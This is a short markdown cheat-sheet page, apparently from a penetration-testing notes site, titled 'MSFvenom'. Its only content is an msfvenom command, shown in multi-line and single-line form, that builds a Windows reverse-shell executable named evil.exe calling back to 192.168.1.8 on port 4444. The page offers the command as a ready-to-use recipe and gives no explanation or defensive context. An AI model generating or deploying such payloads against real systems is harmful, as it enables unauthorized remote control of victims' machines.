---
layout: post
title: 'MSFvenom'
category: examples
permalink: 'examples/msfvenom'
---

### Table of Contents
* [Reverse Shell](#reverse-shell)

### Reverse Shell
```bash
msfvenom \
 --arch x86 \
 --platform windows \
 --payload windows/shell_reverse_tcp \
 LHOST=192.168.1.8 \
 LPORT=4444 \
 -f exe \
 -o evil.exe
```
```bash
msfvenom --arch x86 --platform windows --payload windows/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f exe -o evil.exe
```
